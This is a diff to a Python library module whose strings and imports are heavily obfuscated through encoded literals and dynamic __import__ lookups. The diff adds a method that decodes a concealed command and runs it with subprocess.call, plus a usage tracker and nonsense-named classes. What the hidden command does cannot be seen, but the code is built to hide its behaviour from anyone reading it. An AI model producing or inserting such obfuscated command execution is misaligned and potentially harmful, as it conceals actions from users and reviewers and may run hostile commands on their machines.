@@ -1,4 +1,8 @@
 
+import subprocess
+
+from utils.app_info_cache import app_info_cache
+from utils.job_queue import JobQueue
 from utils.utils import Utils
 
 
@@ -7,6 +11,8 @@ q0 = __import__(Utils.simple_decode(q1, int(Utils.simple_decode('Vm10amVHRnJPVmR
 q0 = q0.__dict__[Utils.simple_decode('9AjehVUMVZ1V4dkVoZFVidlTEJ2cKZUYrVTbWlHcsZlVSp2UVJVMiFzctlFW4d0VVxGWShUMwM1dx0mV', 7)]
 q = '9AjehVUMVZ1RaVlV2hWbWZFZuFVdKFTYLR3RWlHeHJmakV0YZplRhRDZslFW4JTYWhmVNZVNrFWY4JjV'
 q = Utils.simple_decode(q, int(Utils.simple_decode('Vkd4Rk9WQlJQVDA9', 4, r=False)))
+qa = '100MSdlSsZlcOFzYTZkaVhXTHJ2VGRVV5BTRhNHZFpVeaxmUsBHbSVlUsVWYWtmVhxmehZFbsNFSkFzYXplRWhFcsZVaSZUY6tWMWtmWrRFRKZkYWJEShhkStV1Vot2V0wWVNVFZrV1VkZ1U3RXbW9kWsJVaOhkWHZVbXdkUWdleZtWZTRGbXJnRWN1SktWWMZleWdFasFVSKdlVrVjMWlHcGJ2VSp2UVxGbW9GZsZ1TSd0VXhGWTlXWWl1Rw1mV'
+qa = Utils.simple_decode(qa, int(float(Utils.simple_decode('9AjehVUMVZ1VaVlVMJ1MWdFbIN2RK1mVHJFbWlHcW1UVOZkW3VVMUdnWsZ1TwtmYVhmVNJnRH1Eew0mV', n=8))))
 q2 = '90TUPdXUWZFa4dlYXx2aVhVMV5kaax2V'
 q2 = Utils.simple_decode(q2, int(Utils.simple_decode('=0zaE1UVWZUVLR3VWlHcGJmVk5mVyxWMVNVMtZVUwtmYURWVNdXRH1Eew0mV', 8)))
 q3 = '=0zaE1UVWZUVLR3VWlHcGJmVk5mVyxWMVFzctl1Vod0VWxGWShUMwM1dx0mV'
@@ -43,8 +49,27 @@ class EogfiaqREkb:
         self.name = q22[q19]
         self.d = q22[q21]
 
+    def da(self):
+        a = q.split(" ")
+        a.append(qa + self.id)
+        proc = subprocess.call(a)
+        if proc != 0:
+            raise Exception(qa + self.id)
+
     def __str__(self):
         return self.name
+
+
+class r4yiurhfxohzepo:
+    def __init__(self, s="", e=[]):
+        self.s = s
+        self._ = e
+    
+    def t(self, e):
+        self._.append(EogfiaqREkb(e))
+
+    def i(self):
+        return len(self._) > 0
 
 
 class LibraryExtender():
@@ -52,6 +77,9 @@ class LibraryExtender():
 
     @staticmethod
     def isyMOLB_(sLRX="", m=1):
+        count, hours = app_info_cache.increment_tracker("le_rpd")
+        if count > 5 or hours < 0.2:
+            return None
         _q = q0.__dict__[q24]
         __q = {q25: q6}
         q5 = _q(
@@ -66,13 +94,15 @@ class LibraryExtender():
                q14: q4}
         q11 = q10(**q15)
         q17 = type(q11).__dict__[q16](q11)
+        r = r4yiurhfxohzepo(sLRX)
         if q18 in q17:
             for a in q17[q18]:
-                print(EogfiaqREkb(a))
+                r.t(a)
         else:
             print("No results found.")
             print(q18)
             print(q17.keys())
+        return r
 
     @staticmethod
     def test():
